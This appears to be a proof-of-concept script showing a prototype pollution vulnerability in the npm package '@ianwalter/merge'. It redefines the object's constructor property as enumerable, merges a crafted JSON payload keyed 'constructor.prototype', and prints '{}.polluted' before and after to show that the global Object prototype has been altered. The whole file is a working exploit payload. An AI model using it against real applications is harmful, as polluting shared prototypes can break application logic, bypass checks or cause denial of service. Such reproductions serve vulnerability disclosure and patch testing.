var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('@ianwalter/merge');
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
merge(obj, EVIL_JSON);
console.log({}.polluted);